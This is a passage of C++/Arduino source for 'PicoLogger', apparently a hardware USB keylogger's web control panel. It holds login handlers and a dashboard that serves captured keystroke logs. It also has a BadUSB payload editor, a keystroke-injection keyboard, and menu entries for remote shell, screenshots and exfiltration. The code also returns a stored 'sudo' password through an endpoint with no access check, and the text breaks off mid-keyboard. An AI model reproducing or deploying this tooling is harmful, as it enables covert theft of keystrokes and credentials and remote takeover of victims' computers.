void handleLoginPage() {
  const char* loginForm = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>PicoLogger | Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
:root{--bg0:#05040a;--bg1:#090821;--bg2:#0c1030;--panel:rgba(18,10,40,.52);--stroke:rgba(168,140,255,.18);--text:#eef0ff;--muted:rgba(238,240,255,.72);--accent:#39ff88;--accent2:#22e66a;--danger:#ff4b6b;--shadow:0 18px 55px rgba(0,0,0,.55);--shadow2:0 10px 30px rgba(0,0,0,.45);--r:10px;--blur:14px;}
*{box-sizing:border-box;}
html,body{height:100%;}
body{margin:0;font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;color:var(--accent);background:radial-gradient(1200px 700px at 20% 10%, rgba(138,107,255,.20), transparent 60%),radial-gradient(1000px 700px at 85% 15%, rgba(57,255,136,.14), transparent 55%),radial-gradient(900px 620px at 50% 95%, rgba(255,255,255,.06), transparent 55%),linear-gradient(180deg,var(--bg0),var(--bg1) 40%,var(--bg2));overflow-x:hidden;text-align:center;padding:24px 12px 90px;}
.ascii-container{display:flex;justify-content:center;align-items:center;width:100%;overflow:auto;color:var(--accent);text-shadow:0 0 10px rgba(57,255,136,.16);margin:8px 0 14px;}
.ascii-art{background:none;border:none;padding:0;margin:0;font-size:11px;line-height:1.05;font-weight:800;color:var(--accent);text-align:center;text-shadow:0 0 10px rgba(57,255,136,.14);}
.container{width:92%;max-width:520px;margin:0 auto;padding:18px 16px 16px;border-radius:var(--r);border:1px solid var(--stroke);background:linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));backdrop-filter:blur(var(--blur));-webkit-backdrop-filter:blur(var(--blur));box-shadow:var(--shadow);}
h2{margin:0 0 10px;font-size:18px;letter-spacing:.25px;font-weight:900;color:var(--accent);}
label{display:block;text-align:left;margin:10px 0 6px;color:var(--muted);font-size:12px;font-weight:800;}
input{width:100%;padding:12px;border-radius:8px;border:1px solid rgba(180,155,255,.16);background:linear-gradient(180deg, rgba(10,6,24,.65), rgba(10,6,24,.35));color:var(--accent);font-size:16px;outline:none;box-shadow:inset 0 0 0 1px rgba(57,255,136,.06),0 10px 24px rgba(0,0,0,.25);transition:.16s border-color,.16s box-shadow,.16s transform;}
input:focus{border-color:rgba(57,255,136,.30);box-shadow:inset 0 0 0 1px rgba(57,255,136,.12),0 0 0 3px rgba(57,255,136,.10),0 16px 44px rgba(0,0,0,.40);transform:translateY(-1px);}
button{width:100%;margin-top:12px;padding:12px 14px;border-radius:8px;border:1px solid rgba(168,140,255,.22);background:linear-gradient(90deg, rgba(138,107,255,.26), rgba(57,255,136,.18));color:var(--accent);font-weight:900;font-size:16px;cursor:pointer;box-shadow:0 0 10px rgba(57,255,136,.22);transition:.16s transform,.16s filter,.16s box-shadow,.16s background;}
button:hover{transform:translateY(-1px);filter:saturate(1.1);box-shadow:0 16px 44px rgba(0,0,0,.40);}
.footer{position:fixed;left:0;right:0;bottom:0;padding:10px 12px;font-size:12px;color:var(--muted);background:rgba(8,7,20,.70);border-top:1px solid rgba(180,155,255,.12);backdrop-filter:blur(var(--blur));-webkit-backdrop-filter:blur(var(--blur));box-shadow:0 -10px 30px rgba(0,0,0,.45);}
.footer a{color:var(--accent);text-decoration:none;font-weight:900;}
.footer a:hover{text-decoration:underline;text-shadow:0 0 10px rgba(57,255,136,.18);}
@media (max-width:600px){body{padding:22px 12px 92px;}.ascii-art{font-size:9px;}.container{max-width:520px;}.h2{font-size:20px;}input{font-size:18px;padding:14px;}button{font-size:18px;padding:14px 16px;}}
@media (prefers-reduced-motion:reduce){*{transition:none !important;}}
input{font-family: "Courier New", Courier, monospace;}
  </style>
</head>
<body>
  <div class="ascii-container" align="center"><pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
  </pre></div>

  <div class="container">
    <h2>Login</h2>
    <form action="/login" method="POST">
      <label>Username</label>
      <input type="text" name="username" autocomplete="username" required>
      <label>Password</label>
      <input type="password" name="password" autocomplete="current-password" required>
      <button type="submit">Login</button>
    </form>
  </div>

  <div class="footer"><p>Made by @beigeworm | <a href="https://github.com/beigeworm">github.com/beigeworm</a></p></div>
</body>
</html>
    )rawliteral";
    
  server.send(200, "text/html", loginForm);
}

void handleLoginSubmit() {
  if (server.hasArg("username") && server.hasArg("password")) {
    String u = server.arg("username");
    String p = server.arg("password");

    if (u == validUser && p == validPass) {
      isLoggedIn = true;
      server.sendHeader("Location", "/dashboard");
      server.send(302, "text/plain", "Redirecting..");
    } else {
      String response = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>PicoLogger | Login Failed</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
:root{--bg0:#05040a;--bg1:#090821;--bg2:#0c1030;--panel:rgba(18,10,40,.52);--stroke:rgba(168,140,255,.18);--text:#eef0ff;--muted:rgba(238,240,255,.72);--accent:#39ff88;--accent2:#22e66a;--danger:#ff4b6b;--shadow:0 18px 55px rgba(0,0,0,.55);--shadow2:0 10px 30px rgba(0,0,0,.45);--r:10px;--blur:14px;}
*{box-sizing:border-box;}
html,body{height:100%;}
body{margin:0;font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;color:var(--aqua);background:radial-gradient(1200px 700px at 20% 10%, rgba(138,107,255,.20), transparent 60%),radial-gradient(1000px 700px at 85% 15%, rgba(57,255,136,.14), transparent 55%),radial-gradient(900px 620px at 50% 95%, rgba(255,255,255,.06), transparent 55%),linear-gradient(180deg,var(--bg0),var(--bg1) 40%,var(--bg2));overflow-x:hidden;text-align:center;padding:34px 12px 90px;}
.container{width:92%;max-width:520px;margin:0 auto;padding:18px 16px 16px;border-radius:var(--r);border:1px solid var(--stroke);background:linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));backdrop-filter:blur(var(--blur));-webkit-backdrop-filter:blur(var(--blur));box-shadow:var(--shadow);}
h1{margin:0 0 8px;font-size:18px;letter-spacing:.25px;font-weight:950;color:#ffe3e7;text-shadow:0 0 14px rgba(255,75,107,.16);}
p{margin:0 0 12px;color:var(--muted);font-size:12px;line-height:1.5;}
a{display:inline-block;width:100%;padding:12px 14px;border-radius:8px;border:1px solid rgba(168,140,255,.22);background:linear-gradient(90deg, rgba(255,75,107,.16), rgba(138,107,255,.18));color:var(--aqua2);font-weight:950;text-decoration:none;box-shadow:0 0 10px rgba(255,75,107,.16);transition:.16s transform,.16s filter,.16s box-shadow;}
a:hover{transform:translateY(-1px);filter:saturate(1.1);box-shadow:0 16px 44px rgba(0,0,0,.40);}
.footer{position:fixed;left:0;right:0;bottom:0;padding:10px 12px;font-size:12px;color:var(--muted);background:rgba(8,7,20,.70);border-top:1px solid rgba(180,155,255,.12);backdrop-filter:blur(var(--blur));-webkit-backdrop-filter:blur(var(--blur));box-shadow:0 -10px 30px rgba(0,0,0,.45);}
.footer a{width:auto;padding:0;border:0;background:none;box-shadow:none;color:var(--accent);font-weight:900;}
.footer a:hover{transform:none;filter:none;text-decoration:underline;text-shadow:0 0 10px rgba(57,255,136,.18);box-shadow:none;}
@media (max-width:600px){body{padding:30px 12px 92px;}h1{font-size:20px;}p{font-size:13px;}}
@media (prefers-reduced-motion:reduce){*{transition:none !important;}}
  </style>
</head>
<body>
  <div class="container">
    <h1>Invalid Credentials</h1>
    <p>Please try again.</p>
    <a href="/login">Go back to Login</a>
  </div>

  <div class="footer"><p>Made by @beigeworm | <a href="https://github.com/beigeworm">github.com/beigeworm</a></p></div>
</body>
</html>
      )rawliteral";

      server.send(401, "text/html", response);
    }
  }
}

void handleRoot() {
  if (!isLoggedIn) {
    server.sendHeader("Location", "/login");
    server.send(302, "text/plain", "Redirecting..");
    return;
  }
    server.sendHeader("Location", "/dashboard");
    server.send(302, "text/plain", "Redirecting..");
}

void handleLogout() {
  isLoggedIn = false;
  server.sendHeader("Location", "/login");
  server.send(302, "text/plain", "Logging out...");
}

String generateBreadcrumb(String path) {
    if (path == "/") return "/";

    String breadcrumb = "<a class='folder-link' href='/dashboard?path=/#section8'>/</a>";
    int start = 1;
    while (true) {
        int end = path.indexOf('/', start);
        if (end == -1) break;

        String subPath = path.substring(0, end);
        String dirName = path.substring(start, end);
        breadcrumb += "<a class='folder-link' href='/dashboard?path=" + subPath + "'>" + dirName + "/</a>";
        start = end + 1;
    }

    if (start < path.length()) {
        String subPath = path;
        String dirName = path.substring(start);
        breadcrumb += "<a class='folder-link' href='/dashboard?path=" + subPath + "'>" + dirName + "</a>";
    }

    return breadcrumb;
}

void handleUpdatePassword() {
    if (server.hasArg("password")) {
        String newPassword = server.arg("password");
        File sudoFile = LittleFS.open("/sudo.txt", "w");
        if (sudoFile) {
            sudoFile.println(newPassword);
            sudoFile.close();
            server.send(200, "text/plain", "Password updated!");
        } else {
            server.send(500, "text/plain", "Error updating password.");
        }
    } else {
        server.send(400, "text/plain", "Password not provided.");
    }
}

void handleGetPassword() {
    String password;
    File sudoFile = LittleFS.open("/sudo.txt", "r");

    if (sudoFile) {
        password = sudoFile.readStringUntil('\n');
        sudoFile.close();
    } else {
        password = "";
    }

    server.send(200, "text/plain", password);
}

// =============================================== Keylogger / Homepage ================================================== 
void handleDashboard() {
  
    String path = server.hasArg("path") ? server.arg("path") : "/";
    if (path == "") path = "/";

    String html = R"rawliteral(
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PicoLogger | Dashboard</title>
  <style>
    :root{--bg0:#05040a;--bg1:#090821;--bg2:#0c1030;--panel:rgba(18,10,40,.52);--panel2:rgba(22,12,56,.38);--stroke:rgba(168,140,255,.18);--stroke2:rgba(57,255,136,.18);--text:#eef0ff;--muted:rgba(238,240,255,.72);--aqua:#39ff88;--aqua2:#22e66a;--violet:#8a6bff;--violet2:#b49bff;--ok:#39ff88;--warn:#ffcc66;--danger:#ff4b6b;--shadow:0 18px 55px rgba(0,0,0,.55);--shadow2:0 10px 30px rgba(0,0,0,.45);--radius:5px;--radius2:5px;--blur:14px;--font-ui:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;--font-mono:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;}
    *{box-sizing:border-box;}
    html,body{height:100%;}
    body{margin:0;font-family:var(--font-ui);color:var(--aqua2);background:radial-gradient(1200px 700px at 20% 10%, rgba(138,107,255,.20), transparent 60%),radial-gradient(1000px 700px at 85% 15%, rgba(57,255,136,.14), transparent 55%),radial-gradient(900px 620px at 50% 95%, rgba(255,255,255,.06), transparent 55%),linear-gradient(180deg,var(--bg0),var(--bg1) 40%,var(--bg2));overflow-x:hidden;}
    .bg-3d{position:fixed;inset:0;pointer-events:none;z-index:-2;overflow:hidden;background: radial-gradient(1200px 800px at 50% 35%, rgba(40,34,70,.25), rgba(5,5,10,1) 65%, rgba(0,0,0,1) 100%);}
    #starfield{position:absolute;inset:0;width:100%;height:100%;display:block;}
    @media (prefers-reduced-motion: reduce){.bg-3d::after{animation:none;}}
    .shell{min-height:100%;display:grid;grid-template-columns:292px 1fr;}
    .sidebar{position:sticky;top:0;height:100dvh;padding:18px;border-right:1px solid rgba(180,155,255,.10);background:rgba(8,7,20,.62);backdrop-filter:blur(var(--blur));-webkit-backdrop-filter:blur(var(--blur));transform:translateZ(0);will-change:transform;overflow-y:auto;-webkit-overflow-scrolling:touch;padding-bottom:96px;}
    .brand{display:flex;align-items:center;gap:12px;padding:12px 12px;border:1px solid var(--stroke);border-radius:var(--radius2);background:linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));box-shadow:var(--shadow2);}
    .logo{width:40px;height:40px;border-radius:5px;background:radial-gradient(circle at 35% 30%, rgba(138,107,255,.95), transparent 58%),radial-gradient(circle at 70% 70%, rgba(57,255,136,.85), transparent 58%),rgba(255,255,255,.06);box-shadow:0 0 0 1px rgba(255,255,255,.08),0 10px 25px rgba(0,0,0,.35);}
    .brand h1{margin:0;font-size:13px;letter-spacing:.25px;font-weight:700;}
    .brand p{margin:2px 0 0;font-size:12px;color:var(--muted);}
    .mono,code,pre{font-family:var(--font-mono);}
    .nav{margin-top:14px;display:flex;flex-direction:column;gap:10px;}
    .nav button{width:100%;border:1px solid transparent;background:transparent;color:var(--aqua);padding:10px 10px;border-radius:5px;cursor:pointer;text-align:left;display:flex;align-items:center;gap:10px;transition:.16s background,.16s transform,.16s border-color,.16s box-shadow;}
    .nav button:hover{background:rgba(255,255,255,.055);border-color:rgba(180,155,255,.12);transform:translateY(-1px);box-shadow:0 10px 22px rgba(0,0,0,.25);}
    .nav button.active{background:linear-gradient(90deg, rgba(138,107,255,.22), rgba(57,255,136,.12));border-color:rgba(138,107,255,.22);}
    .nav .dot{width:10px;height:10px;border-radius:999px;background:rgba(255,255,255,.20);box-shadow:0 0 0 1px rgba(255,255,255,.10);}
    .nav button.active .dot{background:var(--aqua);box-shadow:0 0 0 1px rgba(57,255,136,.22),0 0 18px rgba(57,255,136,.25);}
    .sidebar-footer{position:absolute;left:18px;right:18px;bottom:18px;display:flex;flex-direction:column;gap:10px;color:var(--muted);font-size:12px;}
    .main{padding:18px 18px 80px;}
    .topbar{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:14px;padding:12px 12px;border:1px solid var(--stroke);border-radius:var(--radius2);background:linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));backdrop-filter:blur(var(--blur));-webkit-backdrop-filter:blur(var(--blur));box-shadow:var(--shadow2);}
    .topbar-left{display:flex;align-items:center;gap:10px;}
    .title{display:flex;flex-direction:column;}
    .title strong{font-size:14px;letter-spacing:.25px;font-weight:700;}
    .title span{font-size:12px;color:var(--muted);}
    .topbar-actions{display:flex;gap:8px;align-items:center;}
    .burger{display:none;width:44px;height:44px;border-radius:5px;border:1px solid var(--stroke);background:rgba(255,255,255,.05);color:var(--aqua);cursor:pointer;}
    .burger:hover{background:rgba(255,255,255,.08);}
    .pill{display:inline-flex;gap:8px;align-items:center;padding:8px 10px;border-radius:999px;border:1px solid var(--stroke);background:rgba(255,255,255,.04);color:var(--muted);font-size:12px;white-space:nowrap;}
    .pill b{color:var(--aqua2);font-weight:700;}
    .btn,button{font-family: "Liberation Mono", "Courier New", Courier, monospace;;border:1px solid var(--stroke);background:linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));color:var(--aqua);padding:10px 12px;border-radius:5px;cursor:pointer;transition:.16s transform,.16s background,.16s box-shadow,.16s border-color,.16s filter;box-shadow:0 0 10px rgba(57,255,136,0.30);}
    .btn:hover,button:hover{transform:translateY(-1px);background:linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.04));box-shadow:0 16px 44px rgba(0,0,0,.40);border-color:rgba(180,155,255,.22);filter:saturate(1.1);}
    .btn.primary{background:linear-gradient(90deg, rgba(138,107,255,.30), rgba(57,255,136,.18));border-color:rgba(138,107,255,.28);}
    .btn.danger{background:rgba(255,75,107,.12);border-color:rgba(255,75,107,.28);color:#ffe3e7;}
    .tab{display:none;animation:fade .16s ease-out;}
    .tab.active{display:block;}
    @keyframes fade{from{opacity:0;transform:translateY(6px);}to{opacity:1;transform:translateY(0);}}
    .card{border:1px solid var(--stroke);background:linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));border-radius:var(--radius2);padding:16px;box-shadow:var(--shadow);backdrop-filter:blur(var(--blur));-webkit-backdrop-filter:blur(var(--blur));}
    .card h2{margin:0 0 6px;font-size:14px;font-weight:700;letter-spacing:.25px;}
    .card p{margin:0;font-size:12px;line-height:1.45;color:var(--muted);}
    input,textarea,select{box-sizing:border-box;width:100%;padding:11px 12px;margin:10px 0;border-radius:5px;border:1px solid rgba(180,155,255,.16);background:linear-gradient(180deg, rgba(10,6,24,.65), rgba(10,6,24,.35));color:var(--aqua);font-size:16px;box-shadow:inset 0 0 0 1px rgba(57,255,136,.06),0 10px 24px rgba(0,0,0,.25);outline:none;transition:.16s border-color,.16s box-shadow,.16s transform;}
    textarea{min-height:120px;resize:vertical;}
    input::placeholder,textarea::placeholder{color:rgba(238,240,255,.45);}
    input:focus,textarea:focus,select:focus{font-family: "Courier New", Courier, monospace;border-color:rgba(57,255,136,.30);box-shadow:inset 0 0 0 1px rgba(57,255,136,.12),0 0 0 3px rgba(57,255,136,.10),0 16px 44px rgba(0,0,0,.40);transform:translateY(-1px);}
    select{appearance:none;background-image:linear-gradient(45deg, transparent 50%, rgba(57,255,136,.70) 50%),linear-gradient(135deg, rgba(57,255,136,.70) 50%, transparent 50%),linear-gradient(180deg, rgba(10,6,24,.65), rgba(10,6,24,.35));background-position:calc(100% - 18px) 52%,calc(100% - 12px) 52%,0 0;background-size:6px 6px,6px 6px,auto;background-repeat:no-repeat;padding-right:34px;}
    table{width:100%;margin-top:14px;border-collapse:collapse;text-align:left;overflow:hidden;border-radius:5px;border:1px solid rgba(180,155,255,.16);background:rgba(12,10,28,.35);box-shadow:0 14px 40px rgba(0,0,0,.35);}
    th,td{padding:10px 12px;border-bottom:1px solid rgba(180,155,255,.10);color:var(--aqua);}
    th{background:linear-gradient(90deg, rgba(138,107,255,.20), rgba(57,255,136,.10));color:rgba(238,240,255,.95);text-shadow:0 0 10px rgba(57,255,136,.10);font-weight:700;}
    tr:hover td{background:rgba(255,255,255,.04);}
    .action-buttons{display:flex;gap:10px;}
    .action-buttons button{flex:1;padding:8px 10px;border-radius:5px;font-size:14px;}
    a.folder-link{color:var(--aqua);text-decoration:none;font-weight:700;}
    a.folder-link:hover{text-decoration:underline;text-shadow:0 0 10px rgba(57,255,136,.22);}
    .breadcrumb{margin:10px 0;color:var(--aqua);font-weight:700;text-shadow:0 0 10px rgba(57,255,136,.18);}
    .switch-container{display:flex;justify-content:center;gap:20px;}
    .switch{position:relative;display:inline-block;width:42px;height:24px;}
    .switch input{opacity:0;width:0;height:0;}
    .slider{position:absolute;cursor:pointer;inset:0;background:linear-gradient(180deg, rgba(138,107,255,.18), rgba(255,255,255,.03));border-radius:999px;transition:.25s;box-shadow:inset 0 0 0 1px rgba(180,155,255,.14),0 10px 22px rgba(0,0,0,.25);}
    .slider:before{content:"";position:absolute;height:16px;width:16px;left:4px;bottom:4px;background:radial-gradient(circle at 35% 30%, rgba(255,255,255,.95), rgba(255,255,255,.30) 55%, transparent 70%),linear-gradient(180deg, rgba(57,255,136,.95), rgba(138,107,255,.65));border-radius:999px;transition:.25s;box-shadow:0 0 14px rgba(57,255,136,.22),0 10px 22px rgba(0,0,0,.28);}
    input:checked + .slider{background:linear-gradient(90deg, rgba(57,255,136,.32), rgba(138,107,255,.18));box-shadow:inset 0 0 0 1px rgba(57,255,136,.22),0 0 0 3px rgba(57,255,136,.10),0 16px 44px rgba(0,0,0,.40);}
    input:checked + .slider:before{transform:translateX(18px);}
    .active2{background:var(--aqua) !important;color:#07101a !important;box-shadow:0 0 16px rgba(57,255,136,.35) !important;}
    .outputBox{box-sizing:border-box;width:100%;height:250px;padding:12px;border-radius:5px;border:1px solid rgba(180,155,255,.14);background:linear-gradient(180deg, rgba(10,6,24,.65), rgba(10,6,24,.35));color:var(--aqua);box-shadow:inset 0 0 0 1px rgba(57,255,136,.06),0 14px 40px rgba(0,0,0,.30);}
    img{width:100%;height:100%;object-fit:cover;border-radius:5px;margin-top:10px;display:block;}
    #fileList{margin-top:20px;text-align:left;background:linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));padding:12px;border-radius:5px;border:1px solid rgba(180,155,255,.14);box-shadow:0 14px 40px rgba(0,0,0,.35);backdrop-filter:blur(var(--blur));-webkit-backdrop-filter:blur(var(--blur));}
    .file-entry{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid rgba(180,155,255,.12);}
    .file-name{flex:3;cursor:pointer;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:rgba(238,240,255,.92);}
    .file-type{flex:1;text-align:center;color:rgba(57,255,136,.70);}
    .file-size{flex:1;text-align:right;color:rgba(57,255,136,.70);}
    .file-actions{flex:0 0 auto;margin-left:auto;}
    .file-name:hover{text-decoration:underline;color:var(--aqua);text-shadow:0 0 10px rgba(57,255,136,.18);}
    .file-entry button{margin-left:8px;min-width:60px;height:30px;line-height:1.2;padding:0 10px;font-size:14px;border-radius:5px;}
    .entry{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid rgba(180,155,255,.12);}
    .entry-title{font-weight:800;color:var(--aqua);text-shadow:0 0 10px rgba(57,255,136,.16);}
    .actions{display:flex;gap:8px;}
    .actions button{padding:6px 10px;border-radius:5px;}
    .keyboard{display:grid;grid-template-columns:repeat(16,1fr);gap:6px;justify-content:center;align-items:center;padding:10px;}
    .key{padding:14px 10px;border-radius:5px;text-align:center;font-size:16px;font-weight:800;cursor:pointer;user-select:none;border:1px solid rgba(180,155,255,.14);background:linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));box-shadow:0 12px 26px rgba(0,0,0,.25);transition:.16s transform,.16s filter,.16s background,.16s border-color,.16s box-shadow;}
    .key:hover{transform:translateY(-1px);border-color:rgba(57,255,136,.22);box-shadow:0 16px 44px rgba(0,0,0,.40);filter:saturate(1.2);}
    .key-wide{grid-column:span 2;}
    .key-space{grid-column:span 11;justify-content:center;align-items:center;margin-left:50%;}
    #alt,#capslock,#ctrl,#gui,#shift{background:linear-gradient(90deg, rgba(138,107,255,.18), rgba(57,255,136,.08));}
    .ascii-container{width:100%;overflow:auto;color:var(--aqua);font-size:14px;font-weight:800;text-shadow:0 0 10px rgba(57,255,136,.12);}
    .ascii-art{background:none;border:none;padding:0;font-size:7px;font-weight:800;color:var(--aqua);text-align:center;text-shadow:0 0 10px rgba(57,255,136,.10);}
    .logbox{width:100%;padding:15px;text-align:left;border-radius:5px;box-shadow:0 0 6px rgba(57,255,136,.18);background:linear-gradient(180deg, rgba(10,6,24,.65), rgba(10,6,24,.35));border:none;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;max-height:400px;overflow-y:auto;}
    .sidebar-scrim{position:fixed;inset:0;z-index:997;background:rgba(0,0,0,.35);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);opacity:0;pointer-events:none;transition:opacity .18s ease;}
    .sidebar.open + .sidebar-scrim{opacity:1;pointer-events:auto;}
    .command-input {width: 88%;}
    @media (max-width: 920px){.command-input {width: 100%;}.shell{grid-template-columns:1fr;}.sidebar{position:fixed;left:0;top:0;height:100dvh;height:100vh;width:min(340px, 88vw);transform:translateX(-110%) translateZ(0);transition:transform .22s ease;z-index:998;bottom:auto;background:rgba(8,7,20,.70);border-right:1px solid rgba(180,155,255,.12);}.sidebar.open{transform:translateX(0) translateZ(0);}.burger{display:inline-flex;align-items:center;justify-content:center;}}
    @media (max-width: 920px){h2{font-size:26px;}textarea{width:100%;font-size:16px;height:180px;padding:14px;}input{width:100%;font-size:16px;padding:14px;}button{width:100%;font-size:15px;padding:14px;height:48px;margin-left:0;margin-top:10px;}.switch{width:48px;height:28px;}.slider:before{height:20px;width:20px;left:4px;bottom:4px;}input:checked + .slider:before{transform:translateX(20px);}.switch-container{flex-direction:column;gap:14px;}#passwordInput{width:100% !important;}.logbox{max-width:880px;}.keyboard{padding:0px;gap:4px;}.key{font-size:8px;padding:9px 5px;}.key-wide{min-width:40px}}
    @media (prefers-reduced-motion: reduce){.tab{animation:none;}.nav button,.btn,button,input,textarea,select{transition:none;}.bg-3d::after{animation:none;}}
    @media (max-height: 600px){.sidebar-footer{display:none !important;}.sidebar{padding-bottom:20px;}}
    label{font-family: "Liberation Mono", "Courier New", Courier, monospace;font-size:12px;}
    .toggle-row {display: flex;gap: 10px;align-items: center;flex-wrap: nowrap;overflow-x: auto;}
    .toggle-item {display: flex;align-items: center;gap: 12px;         }
    .toggle-label {font-weight: 500;}
    .control-row {display: flex;gap: 40px;align-items: center;flex-wrap: nowrap;overflow-x: auto; }
    .control-item {display: flex;align-items: center;gap: 12px;}
    .small-input {width: 70px;padding: 6px;}
    .control-label {font-weight: 500;}
  </style>
</head>

<body>
<div class="bg-3d">
  <canvas id="starfield"></canvas>
</div>
<div class="bg-noise"></div>


<!-- ------------------------ SIDEBAR + SETUP ------------------------- -->

  <div class="shell">
    <aside class="sidebar" id="sidebar">
      <div class="brand">
        <div>
<div class="ascii-container" align="center">
    <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
    </pre>
</div>
        <p align='center' class="mono">Dashboard</p>
        </div>
      </div>

      <nav class="nav" id="nav">
        <button style="box-shadow: none;" class="active" data-tab="section1"><span class="dot"></span> Keylogger Logs</button>
        <button style="box-shadow: none;" data-tab="section2"><span class="dot"></span> BadUSB Payloads</button>
        <button style="box-shadow: none;" data-tab="section3"><span class="dot"></span> Virtual Keyboard</button>
        <button style="box-shadow: none;" data-tab="section4"><span class="dot"></span> Remote Shell</button>
        <button style="box-shadow: none;" data-tab="section5"><span class="dot"></span> Remote Screenshot</button>
        <button style="box-shadow: none;" data-tab="section6"><span class="dot"></span> Remote Exfiltration</button>
        <button style="box-shadow: none;" data-tab="section7"><span class="dot"></span> LittleFS File Manager</button>
        <button style="box-shadow: none;" data-tab="section8"><span class="dot"></span> Settings</button>
      </nav>

      <div class="sidebar-footer">
        <div>
          <div class="mono">v3.0</div>
          <div style="margin-top:4px;">Made by @beigeworm</div>
        </div>

      </div>
    </aside>
    <div class="sidebar-scrim" onclick="toggleSidebar(false)"></div>
    <main class="main">
      <div class="topbar">
        <div class="topbar-left">
          <button class="burger" id="burger" aria-label="Open menu">☰</button>
          <div class="title">
            <strong id="tabTitle">Keylogger Logs</strong>
            <span id="tabSubtitle">View and manage USB keylogger logs</span>
          </div>
        </div>

        <div class="topbar-actions">
          <button class="btn danger" id="logoutBtn">Logout</button>
        </div>
      </div>





<!-- --------------------- KEY LOGS ----------------------------- -->
     
      <section class="tab active" id="tab-section1">
        <div class="card">
        <div class="container">
            <pre class="logbox">
    )rawliteral";    

    html += readLogFile();   

    html += R"rawliteral(
    </pre>
            <form action='/clear' method='POST'>
                <button type='submit'>Clear Logs</button>
            </form>
        </div>

        </div>
      </section>





<!-- ----------------------------- BADUSB PAYLOADS --------------------------- -->
      
      <section class="tab" id="tab-section2">
        <div class="card">
        <div class="container">
            <input type="text" id="filename" placeholder="Enter filename"><br>
            <textarea id="editor" rows="15" placeholder="Write your payload here..."></textarea><br>
            <button onclick="createNewFile()">Save</button>
            
            <h3>Available Payloads</h3>
            <table id="payloadTable">
                <tr><th>Filename</th><th>Actions</th></tr>
            </table>
        </div>
        </div>
      </section>






<!-- ------------------------------ VIRTUAL KEYBOARD --------------------------- -->
      
      <section class="tab" id="tab-section3">
        <div class="card">
        <div class="container">
            <div class="keyboard">
                <div class="key key-wide" onclick="sendKeyPress('ESC')">ESC</div>
                <div class="key" onclick="sendKeyPress('1')">1</div>
                <div class="key" onclick="sendKeyPress('2')">2</div>
                <div class="key" onclick="sendKeyPress('3')">3</div>
                <div class="key" onclick="sendKeyPress('4')">4</div>
                <div class="key" onclick="sendKeyPress('5')">5</div>
                <div class="key" onclick="sendKeyPress('6')">6</div>
                <div class="key" onclick="sendKeyPress('7')">7</div>
                <div class="key" onclick="sendKeyPress('8')">8</div>
                <div class="key" onclick="sendKeyPress('9')">9</div>
                <div class="key" onclick="sendKeyPress('0')">0</div>
                <div class="key" onclick="sendKeyPress('-')">-</div>
                <div class="key" onclick="sendKeyPress('=')">=</div>
                <div class="key key-wide" onclick="sendKeyPress('BACKSPACE')">BKSP</div>
                
                <div class="key key-wide" onclick="sendKeyPress('TAB')">TAB</div>
                <div class="key" onclick="sendKeyPress('q')">Q</div>
                <div class="key" onclick="sendKeyPress('w')">W</div>
                <div class="key" onclick="sendKeyPress('e')">E</div>
                <div class="key" onclick="sendKeyPress('r')">R</div>
                <div class="key" onclick="sendKeyPress('t')">T</div>
                <div class="key" onclick="sendKeyPress('y')">Y</div>
                <div class="key" onclick="sendKeyPress('u')">U</div>
                <div class="key" onclick="sendKeyPress('i')">I</div>
                <div class="key" onclick="sendKeyPress('o')">O</div>
                <div class="key" onclick="sendKeyPress('p')">P</div>
                <div class="key" onclick="sendKeyPress('[')">[</div>
                <div class="key" onclick="sendKeyPress(']')">]</div>
                <div class="key key-wide" id="capslock" onclick="toggleCapsLock()">CAPS</div>
                
                <div class="key key-wide" id="shift" onmousedown="toggleShift(true)" onmouseup="toggleShift(false)">SHIFT</div>
                <div class="key" onclick="sendKeyPress('a')">A</div>
                <div class="key" onclick="sendKeyPress('s')">S</div>
                <div class="key" onclick="sendKeyPress('d')">D</div>
                <div class="key" onclick="sendKeyPress('f')">F</div>
                <div class="key" onclick="sendKeyPress('g')">G</div>
                <div class="key" onclick="sendKeyPress('h')">H</div>
                <div class="key" onclick="sendKeyPress('j')">J</div>
